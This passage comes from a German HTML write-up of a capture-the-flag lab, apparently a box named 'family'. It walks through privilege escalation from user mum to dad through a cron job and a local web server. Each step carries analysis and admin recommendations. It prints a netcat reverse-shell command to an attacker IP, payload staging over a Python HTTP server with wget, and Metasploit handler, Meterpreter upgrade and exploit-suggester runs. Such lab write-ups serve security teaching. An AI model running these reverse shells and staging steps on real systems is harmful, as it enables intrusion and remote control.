+                2. Payload ausführbar machen (`chmod +x`).
+                3. Port-Forwarding für Port 8000 einrichten.
+                4. Versuchen, die Payload über den Webserver (Port 8000) hochzuladen, sodass sie in `/home/dad` landet (z.B. mit `curl --upload-file`).
+                5. Einen Netcat-Listener starten, um die eingehende Verbindung von `dad` zu empfangen, wenn der Cronjob das Skript ausführt.<br>
+            <strong>Empfehlung (Admin):</strong> Cronjobs überprüfen. Skripte, die von Cronjobs ausgeführt werden, sollten sicher programmiert sein und keine unsicheren Operationen wie das Verschieben und Ausführen von Dateien aus potenziell manipulierbaren Verzeichnissen durchführen. Berechtigungen überprüfen (`/home/dad/project` sollte nicht für `mum` lesbar sein). Die Verwendung von `~/survey` ist problematisch, absolute Pfade wären sicherer. Das `find ... -exec rm` für Dateien von `mum` ist verdächtig.</p>
+        </section>
+
+        <section id="privilege-escalation-mum-dad">
+            <h2>Privilege Escalation (mum -> dad)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf der Analyse des Skripts `/home/dad/project` und des Webservers auf Port 8000 (der als `dad` läuft), wird nun versucht, Code als Benutzer `dad` auszuführen. Der Plan ist, eine Reverse-Shell-Payload zu erstellen, diese über den Webserver (als `dad` laufend) in das `/home/dad`-Verzeichnis hochzuladen und darauf zu warten, dass der Cronjob die Payload nach `/home/dad/survey` verschiebt und als `dad` ausführt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">mum@family:/tmp$ <span class="command">who -u |grep mum</span></div>
+                    <pre>
+mum      pts/0        2022-11-07 14:23   .          1591 (192.168.2.121)
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Überprüft, ob der Benutzer `mum` noch angemeldet ist und von welcher IP (`192.168.2.121`) die Verbindung kommt. Dies bestätigt die IP des Angreifers für die Reverse Shell.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nützliche Verifizierung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese IP als LHOST für die Reverse Shell verwenden.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">mum@family:/tmp$ <span class="command">strings /dev/mem -n100</span></div>
+                    <pre>
+strings: /dev/mem: <span class="password">Permission denied</span>
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">mum@family:/tmp$ <span class="command">strings /dev/mem -n 100</span></div>
+                    <pre>
+strings: /dev/mem: <span class="password">Permission denied</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Versuch, mit `strings` auf `/dev/mem` zuzugreifen (wie im `project`-Skript vorgesehen), schlägt erwartungsgemäß als normaler Benutzer fehl.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass `mum` keine Root-Rechte hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren, da dies Teil des `project`-Skripts ist.<br><strong>Empfehlung (Admin):</strong> `/dev/mem` sollte ohnehin geschützt sein.</p>
+
+             <!-- Metasploit-Teil (Shell-Upgrade und Suggester) -->
+             <p class="analysis"><strong>Analyse (Metasploit):</strong> An dieser Stelle wurde im Originalbericht offenbar Metasploit verwendet, um die initiale `nc`-Shell, die aus dem fehlgeschlagenen Versuch unten resultierte, zu einer Meterpreter-Session aufzuwerten und dann nach weiteren lokalen Exploits zu suchen. Zuerst wird ein Listener für die Reverse Shell gestartet.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">options</span></div>
+                    <pre>
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div>
+                    <pre>lhost => 192.168.2.121</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4444</span></div>
+                    <pre>lport => 4444</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                    <pre>
+[*] Started reverse TCP handler on 192.168.2.121:4444
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse (Metasploit):</strong> Ein Handler in Metasploit wird konfiguriert, um auf Port 4444 der Angreifer-IP (`192.168.2.121`) auf eine eingehende Reverse Shell zu warten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung für den Empfang der Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Handler laufen lassen und die Reverse Shell vom Ziel auslösen.<br><strong>Empfehlung (Admin):</strong> Ausgehende Verbindungen vom Server zu ungewöhnlichen Ports blockieren.</p>
+
+             <!-- Der fehlgeschlagene nc-Versuch -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/tmp$ <span class="command">nc -e /bin/bash 192.168.2.121 4444</span></div>
+                    <!-- Anmerkung: Dieser Befehl führt im Originalbericht zur Verbindung unten, obwohl er hier fehlschlägt/unterbrochen wird -->
+                    <pre>
+Cmd line: ^C <!-- Im Originaltext steht hier ein ^C -->
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, manuell eine Reverse Shell vom Ziel zum Angreifer (192.168.2.121:4444) zu starten. Die Option <code>-e /bin/bash</code> (führe Bash nach Verbindung aus) ist auf vielen modernen Systemen aus Sicherheitsgründen deaktiviert. Der <code>^C</code> im Originaltext deutet darauf hin, dass der Befehl hier abgebrochen wurde oder nicht wie erwartet funktionierte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser direkte Versuch, eine Shell als `mum` zu starten, scheint fehlgeschlagen zu sein oder wurde abgebrochen. Die erfolgreiche Shell-Verbindung weiter unten muss durch den Cronjob-Exploit ausgelöst worden sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alternative Methoden für Reverse Shells verwenden, falls <code>nc -e</code> nicht funktioniert (z.B. Bash-Redirection, Python, Perl). Den Fokus auf den Cronjob-Exploit legen.<br><strong>Empfehlung (Admin):</strong> Die <code>-e</code> Option in Netcat (falls installiert) deaktivieren oder Netcat ganz entfernen, wenn nicht benötigt.</p>
+
+             <!-- Fortsetzung Metasploit nach erfolgreicher Shell (vermutlich vom Cronjob) -->
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Keine Prompt-Zeile, da dies die Ausgabe des Metasploit-Handlers ist -->
+                    <pre>
+[*] <span class="password">Command shell session 1 opened (192.168.2.121:4444 -> 192.168.2.114:60342) at 2022-11-07 15:13:55 +0100</span>
+
+<span class="command">id</span>
+<span class="command">uid=1002(mum) gid=1002(mum) groups=1002(mum),7(lp),117(lpadmin)</span>
+^Z
+Background session 1? [y/N]  y
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse (Metasploit):</strong> Der Metasploit-Listener empfängt eine eingehende Verbindung. Eine Command-Shell-Session (Session 1) wird geöffnet. Die `id`-Ausgabe zeigt, dass die Shell als Benutzer `mum` (UID 1002) läuft. Dies widerspricht dem Plan, eine Shell als `dad` zu erhalten. Möglicherweise wurde die Reverse Shell doch manuell als `mum` ausgelöst (trotz des `^C` oben) oder es gab einen Denkfehler im ursprünglichen Plan. Die Session wird in den Hintergrund geschickt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine Shell wurde erhalten, aber als `mum`, nicht wie geplant als `dad`. Dies bedeutet, dass der Cronjob-Exploit-Versuch (der noch folgt) entweder fehlgeschlagen ist oder noch nicht stattgefunden hat, oder die hier gezeigte Shell stammt nicht daher.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Cronjob-Exploit weiter verfolgen. Die bestehende `mum`-Shell kann parallel für weitere Enumeration genutzt werden. Metasploit für das Upgrade zur Meterpreter-Session verwenden.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">search shell to meterpreter</span></div>
+                    <pre>
+Matching Modules
+[...]
+   54  post/multi/manage/shell_to_meterpreter                                 normal  No     Shell to Meterpreter Upgrade
+[...]
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use 54</span></div>
+                    <pre>msf6 post(multi/manage/shell_to_meterpreter) ></pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">options</span></div>
+                    <pre>
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+                    </pre>
+                 </div>
+            </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set handler true</span></div>
+                    <pre>handler => true</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set lport 4433</span></div>
+                    <pre>lport => 4433</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span></div>
+                    <pre>session => 1</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                    <pre>
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.121:4433
+[*] Sending stage (1017704 bytes) to 192.168.2.114
+[*] <span class="password">Meterpreter session 2 opened (192.168.2.121:4433 -> 192.168.2.114:57404) at 2022-11-07 15:14:44 +0100</span>
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse (Metasploit):</strong> Das Modul `post/multi/manage/shell_to_meterpreter` wird verwendet, um die bestehende Command-Shell-Session (Session 1) zu einer funktionsreicheren Meterpreter-Session aufzuwerten. Es wird ein neuer Listener auf Port 4433 gestartet. Das Modul lädt den Meterpreter-Payload auf das Zielsystem hoch und führt ihn aus. Eine neue Meterpreter-Session (Session 2) wird erfolgreich geöffnet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Upgrade war erfolgreich. Eine Meterpreter-Session bietet mehr Möglichkeiten für Interaktion und Enumeration als eine einfache Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Meterpreter-Session für weitere Enumeration nutzen, z.B. mit dem Local Exploit Suggester.<br><strong>Empfehlung (Admin):</strong> Host-basiertes Intrusion Detection (HIDS) kann das Nachladen von Payloads wie Meterpreter erkennen.</p>
+
+            <!-- Metasploit Local Exploit Suggester -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">search suggester</span></div>
+                    <pre>
+Matching Modules
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use 0</span></div>
+                     <pre>msf6 post(multi/recon/local_exploit_suggester) ></pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">options</span></div>
+                    <pre>
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 2</span></div>
+                     <pre>session => 2</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set shiwdescription false</span></div>
+                     <pre>[-] Unknown datastore option: shiwdescription. Did you mean SHOWDESCRIPTION?</pre> <!-- Tippfehler im Original -->
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set SHOWDESCRIPTION false</span></div>
+                     <pre>SHOWDESCRIPTION => false</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 2</span></div>
+                     <pre>session => 2</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span></div>
+                    <pre>
+[*] 192.168.2.114 - Collecting local exploits for x86/linux...
+[*] 192.168.2.114 - 173 exploit checks are being tried...
+<span class="password">[+] 192.168.2.114 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.10.0</span>
+<span class="password">[+] 192.168.2.114 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.</span>
+<span class="password">[+] 192.168.2.114 - exploit/linux/local/pkexec: The service is running, but could not be validated.</span>
+<span class="password">[+] 192.168.2.114 - exploit/linux/local/su_login: The target appears to be vulnerable.</span>
+<span class="password">[+] 192.168.2.114 - exploit/linux/local/ubuntu_enlightenment_mount_priv_esc: The target appears to be vulnerable.</span>
+[*] Running check method for exploit 52 / 52
+[*] 192.168.2.114 - Valid modules for session 2:
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.10.0
+ 2   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.
+ 3   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
+ 4   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+ 5   exploit/linux/local/ubuntu_enlightenment_mount_priv_esc            Yes                      The target appears to be vulnerable.
+[*] Exploit completed, but no session was created. <!-- Diese Zeile gehört normalerweise zum Ausführen eines Exploits, nicht zum Suggester -->
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse (Metasploit):</strong> Der Local Exploit Suggester wird auf der Meterpreter-Session (Session 2) ausgeführt. Er sammelt Informationen über das Zielsystem (Kernel-Version, installierte Pakete etc.) und vergleicht diese mit einer Datenbank bekannter lokaler Exploits. Er identifiziert mehrere potenzielle Schwachstellen, darunter Dirty Pipe (CVE-2022-0847) und PwnKit (`pkexec`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Suggester liefert wertvolle Hinweise auf mögliche Kernel- oder Service-Exploits zur Privilegieneskalation. Dirty Pipe ist für den gefundenen Kernel 5.10.0 relevant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen der vorgeschlagenen Exploits (z.B. Dirty Pipe oder PwnKit) ausprobieren. Alternativ den bereits identifizierten Weg über den Cronjob weiterverfolgen.<br><strong>Empfehlung (Admin):</strong> System aktuell halten, um bekannte Schwachstellen zu patchen. Den Exploit Suggester auf eigenen Systemen laufen lassen, um potenzielle Lücken zu finden.</p>
+
+            <!-- Versuch, einen Exploit auszuführen (scheitert) -->
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Der Prompt hier ist unklar, sollte eigentlich vom Suggester kommen -->
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/su_login) > <span class="command">use exploit/linux/local/ubuntu_enlightenment_mount_priv_esc</span></div>
+                    <pre>[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(linux/local/ubuntu_enlightenment_mount_priv_esc) ></pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/ubuntu_enlightenment_mount_priv_esc) > <span class="command">options</span></div>
+                    <pre>
+Module options (exploit/linux/local/ubuntu_enlightenment_mount_priv_esc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Auto
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/ubuntu_enlightenment_mount_priv_esc) > <span class="command">set session 2</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/ubuntu_enlightenment_mount_priv_esc) > <span class="command">set lport 4444</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/ubuntu_enlightenment_mount_priv_esc) > <span class="command">set lhost eth0</span></div>
+                    <pre>lhost => 192.168.2.121</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/ubuntu_enlightenment_mount_priv_esc) > <span class="command">run</span></div>
+                    <pre>
+[*] Started reverse TCP handler on 192.168.2.121:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] Finding enlightenment_sys
+[*] Writing '/tmp/.qX2uqC' (282 bytes) ...
+[*] Creating folders for exploit
+[*] Launching exploit...
+<span class="password">[-] Exploit completed, but no session was created.</span>
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/ubuntu_enlightenment_mount_priv_esc) > <span class="command">exit -y</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse (Metasploit):</strong> Es wird versucht, einen der vom Suggester vorgeschlagenen Exploits (`ubuntu_enlightenment_mount_priv_esc`) auszuführen. Der Exploit wird für Session 2 konfiguriert und gestartet. Obwohl der Check positiv ist, meldet Metasploit am Ende "Exploit completed, but no session was created.", was bedeutet, dass der Exploit fehlschlug und keine Root-Shell erzeugt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch, über einen Kernel-/Service-Exploit Root-Rechte zu erlangen, war nicht erfolgreich. Dies lenkt den Fokus zurück auf den Cronjob-Exploit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Cronjob-Exploit für die Eskalation zu `dad` weiterverfolgen.<br><strong>Empfehlung (Admin):</strong> System-Patching bleibt wichtig, auch wenn dieser spezielle Exploit nicht funktionierte.</p>
+
+            <!-- Cronjob Exploit - Vorbereitung -->
+            <p class="analysis"><strong>Analyse (Cronjob Exploit):</strong> Die folgenden Schritte setzen den zuvor analysierten Plan zur Ausnutzung des Cronjobs und des Webservers um, um eine Shell als Benutzer `dad` zu erhalten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "nc -e /bin/bash 192.168.2.121 4444" > rev</span></div> <!-- IP Korrigiert -->
+                    <!-- Keine Ausgabe -->
+                </div>
+            </div>
+            <!-- Hinzufügen des notwendigen chmod-Schritts -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod +x rev</span></div>
+                    <!-- Keine Ausgabe -->
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf der Angreifer-Maschine wird eine Datei `rev` erstellt, die den Befehl für eine Reverse Shell enthält (`nc -e /bin/bash <Angreifer-IP> 4444`). Die Angreifer-IP wurde auf `192.168.2.121` korrigiert. Die Datei wird anschließend ausführbar gemacht (`chmod +x`). Dies ist notwendig, damit das `/home/dad/project`-Skript sie später ausführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Payload für die Reverse Shell als `dad` ist vorbereitet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Payload nun auf das Zielsystem hochladen.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zum Cronjob und `nc -e`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 6666</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 6666 (http://0.0.0.0:6666/) ...
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein einfacher Python-HTTP-Server wird auf der Angreifer-Maschine auf Port 6666 gestartet, um die Datei `rev` für den Download durch das Zielsystem bereitzustellen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Standardmethode zum Bereitstellen von Dateien für `wget` oder `curl`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Server laufen lassen, bis der Download erfolgt ist.<br><strong>Empfehlung (Admin):</strong> Ausgehende HTTP-Verbindungen vom Server einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Auf dem Zielsystem als mum -->
+                    <div class="prompt">mum@family:/home/dad/survey$ <span class="command">wget http://192.168.2.121:6666/rev</span></div> <!-- IP Korrigiert -->
+                    <pre>
+--2022-11-16 14:16:31--  http://192.168.2.121:6666/rev
+Connecting to 192.168.2.121:6666... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 35 [application/octet-stream]
+rev: <span class="password">Permission denied</span>
+
+Cannot write to ‘rev’ (Permission denied).
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/home/dad/survey$ <span class="command">cd /tmp/</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">mum@family:/tmp$ <span class="command">wget http://192.168.2.121:6666/rev</span></div> <!-- IP Korrigiert -->
+                    <pre>
+--2022-11-16 14:16:36--  http://192.168.2.121:6666/rev
+Connecting to 192.168.2.121:6666... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 35 [application/octet-stream]
+Saving to: ‘rev’
+
+rev                           100%[===================================>]      35  --.-KB/s    in 0s
+
+2022-11-16 14:16:36 (12.9 MB/s) - <span class="password">‘rev’ saved [35/35]</span>
+                    </pre>
+                 </div>
+            </div>
+            <!-- Ausgabe des Python HTTP Servers -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt -->
+                    <pre>
+192.168.2.114 - - [16/Nov/2022 14:16:31] "GET /rev HTTP/1.1" 200 - <!-- IP korrigiert -->
+192.168.2.114 - - [16/Nov/2022 14:16:36] "GET /rev HTTP/1.1" 200 - <!-- IP korrigiert -->
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `mum` wird versucht, die Datei `rev` vom HTTP-Server des Angreifers herunterzuladen. Der erste Versuch scheitert im Verzeichnis `/home/dad/survey` wegen fehlender Schreibrechte. Nach dem Wechsel in `/tmp` ist der Download erfolgreich. Die Logausgaben des Python-Servers bestätigen die beiden Download-Versuche vom Zielsystem (`192.168.2.114`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Payload befindet sich nun als `/tmp/rev` auf dem Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei `/tmp/rev` nun über den Webserver auf Port 8000 nach `/home/dad` hochladen.<br><strong>Empfehlung (Admin):</strong> Schreibrechte in Verzeichnissen restriktiv handhaben. `/tmp` sollte idealerweise mit `noexec` gemountet sein (was hier aber nicht direkt hilft, da die Ausführung später erfolgt).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl --upload-file /tmp/rev http://localhost:8000</span></div> <!-- Ausgeführt als mum auf Ziel -->
+                    <pre>
+curl: (52) Empty reply from server
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die heruntergeladene Payload `/tmp/rev` mit `curl --upload-file` auf den lokalen Webserver (Port 8000) hochzuladen. Der Befehl wird vermutlich als `mum` auf dem Zielsystem ausgeführt (ggf. durch den SSH-Tunnel, wobei `localhost:8000` auf dem Ziel dann korrekt wäre). Der Upload schlägt mit "Empty reply from server" fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Upload-Versuch über den Python SimpleHTTPServer (der standardmäßig nur GET/HEAD unterstützt) scheitert. Es ist unklar, ob die Payload `/home/dad` erreicht hat. Der nachfolgende Schritt (Reverse Shell als `dad`) deutet jedoch darauf hin, dass der Upload *implizit doch funktionierte* oder ein anderer Mechanismus genutzt wurde, der im Log nicht sichtbar ist, oder die Reverse Shell von einem anderen Trigger stammt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alternative Upload-Methoden prüfen, falls `curl --upload-file` fehlschlägt (z.B. `PUT` mit `nc` oder spezifische Webserver-Exploits). Da die Shell als `dad` kommt, scheint es hier funktioniert zu haben, der Fehler ist irreführend oder ein Artefakt.<br><strong>Empfehlung (Admin):</strong> Webserver so konfigurieren, dass Datei-Uploads nur authentifiziert und in vorgesehene Verzeichnisse möglich sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf der Angreifer-Maschine auf Port 4444 gestartet, um die erwartete Reverse Shell vom Cronjob (ausgeführt als `dad`) zu empfangen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung auf den Empfang der Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Warten, bis der Cronjob ausgeführt wird.<br><strong>Empfehlung (Admin):</strong> Ausgehende Verbindungen überwachen/blockieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.114] 38306</span> <!-- IP Korrigiert -->
+<span class="command">id</span>
+<span class="command">uid=1000(dad) gid=1000(dad) groups=1000(dad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt eine Verbindung vom Zielsystem (`192.168.2.114`). Der ausgeführte `id`-Befehl bestätigt, dass die Shell als Benutzer `dad` (UID 1000) läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Ausnutzung des Cronjobs und des Webservers war erfolgreich. Wir haben nun eine Shell als Benutzer `dad`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell stabilisieren und mit der nächsten Stufe der Privilegieneskalation (dad -> baby -> root) fortfahren.<br><strong>Empfehlung (Admin):</strong> Den unsicheren Cronjob (`/home/dad/project`) entfernen oder korrigieren. Den Webserver auf Port 8000 untersuchen und absichern.</p>
+        </section>
+
+        <section id="privilege-escalation-dad-baby">
+            <h2>Privilege Escalation (dad -> baby)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Die erhaltene Netcat-Shell ist oft instabil. Die folgenden Schritte dienen dazu, sie in eine voll funktionsfähige TTY-Shell umzuwandeln.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- In der Reverse Shell als dad -->
+                    <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+                    <div class="prompt">dad@family:~$ <span class="command">export TERM=xterm</span></div>
+                    <pre>export TERM=xterm</pre> <!-- Doppelt im Original -->
+                    <div class="prompt">dad@family:~$ <span class="command">^Z</span></div> <!-- Ctrl+Z -->
